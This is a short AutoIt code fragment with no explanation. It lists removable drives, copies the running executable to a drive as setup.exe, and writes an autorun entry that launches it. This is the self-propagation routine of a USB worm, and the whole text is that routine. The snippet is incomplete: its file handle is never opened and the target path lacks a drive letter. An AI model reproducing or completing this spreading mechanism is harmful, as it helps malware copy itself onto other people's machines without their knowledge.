DriveGetDrive ( "removable" )
FileCopy ( @AutoItExe , "\\setup.exe" , 1 )
FileWrite ( $fh , "[AUTORUN]" )
FileWrite ( $fh , "shellexecute=setup.exe" )
